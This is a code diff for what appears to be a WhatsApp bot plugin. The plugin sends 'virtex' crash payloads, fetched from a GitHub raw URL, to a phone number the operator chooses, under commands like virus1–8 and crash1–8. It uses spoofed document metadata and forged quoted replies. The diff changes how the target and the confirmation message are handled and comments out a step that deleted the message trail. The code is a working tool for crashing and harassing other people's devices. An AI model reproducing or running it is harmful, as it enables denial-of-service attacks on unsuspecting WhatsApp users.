@@ -4,7 +4,16 @@ import fetch from 'node-fetch'
 const { prepareWAMessageMedia, proto, generateWAMessageFromContent, getLastMessageInChat } = (await import('@adiwajshing/baileys')).default
 
 let handler  = async (m, { conn, args, text, command, usedPrefix, participants }) => {
-let from = ${text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' || m.chat}
+    
+let from 
+if (text) from = `${text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'}`;
+if (!text) from = `${m.chat}`;
+    
+let send     
+if (text) send = `@${m.sender.split("@s.whatsapp.net")[0]}`;
+if (!text) send = `𝙴𝚂𝚃𝙴 𝙲𝙷𝙰𝚃`;
+    
+    
 const doc = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})}, "message": { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc", "mimetype": "application/octet-stream", "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=", "fileLength": "64455", "pageCount": 1, "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=", "fileName": `simple•MD`, "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="}}}
     
 let virtex1 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/1.txt').then(v => v.text());
@@ -90,11 +99,10 @@ case 'virus8': case 'c8': case 'binario8': case 'traba8': case 'crash8': {
 conn.fakeReply(from, virtex10, '0@s.whatsapp.net', '🔥 *By ĐłɆ₲Ø-Ø₣₵ 🔥', 'status@broadcast')}
 break    
 }
-const lastMsgInChat = await getLastMessageInChat(from) 
-await conn.chatModify({ delete: true, lastMessages: [{ key: lastMsgInChat.key, messageTimestamp: lastMsgInChat.messageTimestamp }]}, from)
-
-if (from == m.chat) from = 'este chat'   
-m.reply(`*[❗𝐈𝐍𝐅𝐎❗] 𝚂𝙴 𝙴𝙽𝚅𝙸𝙾 𝙲𝙾𝙽 𝙴𝚇𝙸𝚃𝙾 ${command} 𝙰 ${from}*`)
+//const lastMsgInChat = await getLastMessageInChat(from) 
+//await conn.chatModify({ delete: true, lastMessages: [{ key: lastMsgInChat.key, messageTimestamp: lastMsgInChat.messageTimestamp }]}, from)
+    
+await conn.reply(m.chat, `*[❗𝐈𝐍𝐅𝐎❗] 𝚂𝙴 𝙴𝙽𝚅𝙸𝙾 𝙲𝙾𝙽 𝙴𝚇𝙸𝚃𝙾 ${command} 𝙰 ${send}*`, m, { mentions: [m.sender]})  
 }
 handler.command = /^(virus1|c1|binario1|traba1|crash1|virus2|c2|binario2|traba2|crash2|virus3|c3|binario3|traba3|crash3|virus4|c4|binario4|traba4|crash4|virus5|c5|binario5|traba5|crash5|virus6|c6|binario6|traba6|crash6|virus7|c7|binario7|traba7|crash7|virus8|c8|binario8|traba8|crash8)$/i
 handler.rowner = true
